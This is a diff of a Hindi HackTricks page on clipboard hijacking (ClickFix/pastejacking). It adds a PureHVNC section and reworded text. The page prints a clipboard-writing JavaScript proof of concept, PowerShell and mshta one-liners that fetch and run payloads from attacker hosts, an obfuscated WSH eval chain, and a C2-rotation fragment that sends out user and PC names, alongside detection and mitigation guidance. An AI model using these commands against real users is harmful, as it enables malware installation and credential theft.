@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> "आप कभी भी कुछ ऐसा न पेस्ट करें जो आपने खुद कॉपी नहीं किया।" – पुरानी लेकिन अभी भी मान्य सलाह
+> "कभी भी कोई चीज़ पेस्ट न करें जो आपने स्वयं कॉपी नहीं की हो।" – पुरानी पर अब भी प्रासंगिक सलाह
 
-## Overview
+## अवलोकन
 
-Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता नियमित रूप से कमांड को कॉपी और पेस्ट करते हैं बिना उन्हें जांचे। एक दुर्भावनापूर्ण वेब पृष्ठ (या किसी भी JavaScript-सक्षम संदर्भ जैसे कि एक Electron या Desktop एप्लिकेशन) प्रोग्रामेटिक रूप से हमलावर-नियंत्रित पाठ को सिस्टम क्लिपबोर्ड में डालता है। पीड़ितों को, सामान्यतः सावधानीपूर्वक तैयार किए गए सोशल-इंजीनियरिंग निर्देशों द्वारा, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या एक टर्मिनल खोलने और क्लिपबोर्ड सामग्री को *पेस्ट* करने के लिए प्रोत्साहित किया जाता है, जिससे तुरंत मनमाने कमांड निष्पादित होते हैं।
+Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता सामान्यतः commands को बिना जाँच किए copy-and-paste कर लेते हैं। एक दुर्भावनापूर्ण वेब पेज (या कोई भी JavaScript-capable context जैसे Electron या Desktop application) प्रोग्रामेटिक रूप से attacker-controlled text को system clipboard में रख देता है। पीड़ितों को आमतौर पर सावधानीपूर्वक तैयार किए गए social-engineering निर्देशों द्वारा प्रेरित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या एक terminal खोलें और *paste* करके clipboard की सामग्री चिपकाएँ, जिससे तुरंत arbitrary commands निष्पादित हो जाते हैं।
 
-क्योंकि **कोई फ़ाइल डाउनलोड नहीं की जाती और कोई अटैचमेंट नहीं खोला जाता**, यह तकनीक अधिकांश ई-मेल और वेब-सामग्री सुरक्षा नियंत्रणों को बायपास करती है जो अटैचमेंट, मैक्रोज़ या सीधे कमांड निष्पादन की निगरानी करती हैं। इसलिए यह हमला फ़िशिंग अभियानों में लोकप्रिय है जो सामान्य मैलवेयर परिवारों जैसे NetSupport RAT, Latrodectus लोडर या Lumma Stealer को वितरित करते हैं।
+क्योंकि **कोई file डाउनलोड नहीं होता और कोई attachment open नहीं किया जाता**, यह technique उन अधिकांश e-mail और web-content security controls को बायपास कर देती है जो attachments, macros या direct command execution की मॉनिटरिंग करते हैं। इसलिए यह attack phishing campaigns में लोकप्रिय है जो commodity malware परिवारों जैसे NetSupport RAT, Latrodectus loader या Lumma Stealer पहुँचाते हैं।
 
 ## JavaScript Proof-of-Concept
 ```html
@@ -22,17 +22,17 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-पुराने अभियानों ने `document.execCommand('copy')` का उपयोग किया, जबकि नए अभियानों में असिंक्रोनस **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भरता होती है।
+पुरानी कैंपेन `document.execCommand('copy')` का उपयोग करती थीं, जबकि नए संस्करण असिंक्रोनस **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।
 
 ## ClickFix / ClearFake प्रवाह
 
-1. उपयोगकर्ता एक टाइपोसक्वाटेड या समझौता किए गए साइट पर जाता है (जैसे `docusign.sa[.]com`)
-2. इंजेक्टेड **ClearFake** जावास्क्रिप्ट एक `unsecuredCopyToClipboard()` सहायक को कॉल करता है जो चुपचाप एक Base64-कोडित PowerShell एक-लाइनर को क्लिपबोर्ड में स्टोर करता है।
-3. HTML निर्देश पीड़ित को बताते हैं: *“**Win + R** दबाएं, कमांड पेस्ट करें और समस्या को हल करने के लिए Enter दबाएं।”*
-4. `powershell.exe` निष्पादित होता है, एक संग्रह डाउनलोड करता है जिसमें एक वैध निष्पादन योग्य और एक दुर्भावनापूर्ण DLL (क्लासिक DLL साइडलोडिंग) शामिल होता है।
-5. लोडर अतिरिक्त चरणों को डिक्रिप्ट करता है, शेलकोड इंजेक्ट करता है और स्थिरता स्थापित करता है (जैसे शेड्यूल किया गया कार्य) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।
+1. उपयोगकर्ता किसी typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
+2. इंजेक्ट किया गया **ClearFake** JavaScript `unsecuredCopyToClipboard()` हेल्पर को कॉल करता है जो चुपचाप क्लिपबोर्ड में एक Base64-encoded PowerShell one-liner स्टोर कर देता है।
+3. HTML निर्देश पीड़ित को बताते हैं: *“Press **Win + R**, कमांड पेस्ट करें और समस्या को सुलझाने के लिए Enter दबाएँ।”*
+4. `powershell.exe` चलती है, एक आर्काइव डाउनलोड करती है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
+5. लॉडर अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence इंस्टॉल करता है (उदा. scheduled task) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।
 
-### उदाहरण NetSupport RAT श्रृंखला
+### NetSupport RAT श्रृंखला का उदाहरण
 ```powershell
 powershell -nop -w hidden -enc <Base64>
 # ↓ Decodes to:
@@ -40,42 +40,77 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (वैध Java WebStart) अपने निर्देशिका में `msvcp140.dll` की खोज करता है।
-* दुर्भावनापूर्ण DLL **GetProcAddress** के साथ APIs को गतिशील रूप से हल करता है, **curl.exe** के माध्यम से दो बाइनरी (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें एक रोलिंग XOR कुंजी `"https://google.com/"` का उपयोग करके डिक्रिप्ट करता है, अंतिम शेलकोड को इंजेक्ट करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनजिप करता है।
+* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` की खोज करता है।
+* दुष्ट DLL डायनामिक रूप से **GetProcAddress** के साथ APIs को resolve करता है, **curl.exe** के माध्यम से दो binaries (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।
 
 ### Latrodectus Loader
 ```
 powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
-2. **cscript.exe** के अंदर JScript डाउनलोडर को निष्पादित करता है
-3. एक MSI पेलोड लाता है → एक साइन किए गए एप्लिकेशन के बगल में `libcef.dll` छोड़ता है → DLL साइडलोडिंग → शेलकोड → Latrodectus।
+2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
+3. MSI payload प्राप्त करता है → signed application के पास `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus।
 
-### MSHTA के माध्यम से Lumma Stealer
+### Lumma Stealer MSHTA के माध्यम से
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-The **mshta** कॉल एक छिपा हुआ PowerShell स्क्रिप्ट लॉन्च करता है जो `PartyContinued.exe` को प्राप्त करता है, `Boat.pst` (CAB) को निकालता है, `extrac32` और फ़ाइल संयोजन के माध्यम से `AutoIt3.exe` को पुनर्निर्माण करता है और अंततः एक `.a3x` स्क्रिप्ट चलाता है जो ब्राउज़र क्रेडेंशियल्स को `sumeriavgv.digital` पर एक्सफिल्ट्रेट करता है।
+The **mshta** कॉल एक छिपा हुआ PowerShell script लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `extrac32` & file concatenation के माध्यम से `AutoIt3.exe` को पुनर्निर्मित करती है और अंत में एक `.a3x` script चलाती है जो ब्राउज़र credentials को `sumeriavgv.digital` पर exfiltrates करती है।
 
-## Detection & Hunting
+## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)
 
-ब्लू-टीम क्लिपबोर्ड, प्रक्रिया-निर्माण और रजिस्ट्री टेलीमेट्री को मिलाकर पेस्टजैकिंग दुरुपयोग को पहचान सकती है:
+कुछ ClickFix campaigns पूरी तरह से file downloads को छोड़ देते हैं और पीड़ितों को निर्देश देते हैं कि वे एक one‑liner पेस्ट करें जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persists करता है, और रोज़ाना C2 rotate करता है। देखा गया उदाहरण शृंखला:
+```powershell
+powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
+ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
+```
+मुख्य विशेषताएँ
+- Obfuscated URL को runtime पर reverse किया जाता है ताकि साधारण निरीक्षण नाकाम हो सके।
+- JavaScript अपने आप को Startup LNK (WScript/CScript) के माध्यम से स्थायी करता है, और वर्तमान दिन के अनुसार C2 चुनता है — जिससे तेज domain rotation सक्षम होता है।
 
-* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** कमांड का एक इतिहास रखता है - असामान्य Base64 / ओबफस्केटेड प्रविष्टियों की तलाश करें।
-* Security Event ID **4688** (Process Creation) जहां `ParentImage` == `explorer.exe` और `NewProcessName` में { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
-* Event ID **4663** फ़ाइल निर्माण के लिए `%LocalAppData%\Microsoft\Windows\WinX\` या असामान्य 4688 घटना से ठीक पहले अस्थायी फ़ोल्डरों के तहत।
-* EDR क्लिपबोर्ड सेंसर (यदि मौजूद हैं) - `Clipboard Write` के तुरंत बाद एक नए PowerShell प्रक्रिया का सहसंबंध करें।
+C2s को date के अनुसार rotate करने के लिए उपयोग किया गया Minimal JS fragment:
+```js
+function getURL() {
+var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
+var current_datetime = new Date().getTime();
+var no_days = getDaysDiff(0, current_datetime);
+return 'https://'
++ getListElement(C2_domain_list, no_days)
++ '/Y/?t=' + current_datetime
++ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
+}
+```
+अगला चरण आम तौर पर एक लोडर तैनात करता है जो persistence स्थापित करता है और एक RAT (e.g., PureHVNC) को प्राप्त करता है, अक्सर TLS को एक hardcoded प्रमाणपत्र पर पिन करता है और ट्रैफ़िक को chunk करता है।
+
+Detection ideas specific to this variant
+- प्रोसेस ट्री: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
+- Startup artifacts: LNK `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में जिसमें WScript/CScript को `%TEMP%`/`%APPDATA%` के अंतर्गत एक JS पाथ देता है।
+- Registry/RunMRU और command‑line telemetry जिनमें `.split('').reverse().join('')` या `eval(a.responseText)` शामिल हों।
+- बार-बार `powershell -NoProfile -NonInteractive -Command -` का उपयोग बड़े stdin payloads के साथ ताकि लंबी स्क्रिप्ट्स बिना लंबे command lines के फीड हों।
+- Scheduled Tasks जो बाद में LOLBins जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` को एक updater‑लुकिंग task/path (उदाहरण के लिए, `\GoogleSystem\GoogleUpdater`) के तहत चलाते हैं।
+
+Threat hunting
+- दैनिक-रोटेट होने वाले C2 hostnames और URLs जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` पैटर्न हो।
+- clipboard write इवेंट्स को correlate करें जो Win+R paste के बाद और तत्क्षण `powershell.exe` execution के साथ होते हों।
+
+
+ब्लू-टीम्स clipboard, process-creation और registry telemetry को मिलाकर pastejacking злоप्रयोग को सटीक रूप से पहचान सकते हैं:
+
+* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` Win + R कमांड्स का इतिहास रखता है – असामान्य Base64 / obfuscated एंट्रियों की तलाश करें।
+* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` उन में से एक हो { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
+* Event ID **4663** उन फाइल क्रिएशंस के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या अस्थायी फ़ोल्डरों में suspicious 4688 इवेंट से ठीक पहले होती हैं।
+* EDR clipboard sensors (यदि मौजूद हों) – `Clipboard Write` को तुरंत नए PowerShell प्रोसेस के साथ correlate करें।
 
 ## Mitigations
 
-1. ब्राउज़र हार्डनिंग - क्लिपबोर्ड लिखने की पहुंच को अक्षम करें (`dom.events.asyncClipboard.clipboardItem` आदि) या उपयोगकर्ता इशारा की आवश्यकता करें।
-2. सुरक्षा जागरूकता - उपयोगकर्ताओं को संवेदनशील कमांड *टाइप* करने या पहले उन्हें टेक्स्ट संपादक में पेस्ट करने के लिए सिखाएं।
-3. PowerShell Constrained Language Mode / Execution Policy + Application Control को मनमाने एक-लाइनर्स को ब्लॉक करने के लिए।
-4. नेटवर्क नियंत्रण - ज्ञात पेस्टजैकिंग और मैलवेयर C2 डोमेन के लिए आउटबाउंड अनुरोधों को ब्लॉक करें।
+1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को अक्षम करें या user gesture आवश्यक करें।
+2. Security awareness – उपयोगकर्ताओं को सिखाएँ कि संवेदनशील कमांड्स को टाइप करें या पहले किसी text editor में पेस्ट करें।
+3. PowerShell Constrained Language Mode / Execution Policy + Application Control ताकि arbitrary one-liners को ब्लॉक किया जा सके।
+4. Network controls – जाने-माने pastejacking और malware C2 domains के लिए outbound requests को ब्लॉक करें।
 
 ## Related Tricks
 
-* **Discord Invite Hijacking** अक्सर एक दुर्भावनापूर्ण सर्वर में उपयोगकर्ताओं को लुभाने के बाद उसी ClickFix दृष्टिकोण का दुरुपयोग करता है:
+* **Discord Invite Hijacking** अक्सर उपयोगकर्ताओं को किसी malicious server में लुभाने के बाद उसी ClickFix तरीके का दुरुपयोग करता है:
 
 {{#ref}}
 discord-invite-hijacking.md
@@ -85,5 +120,6 @@ discord-invite-hijacking.md
 
 - [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
 - [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 
 {{#include ../../banners/hacktricks-training.md}}
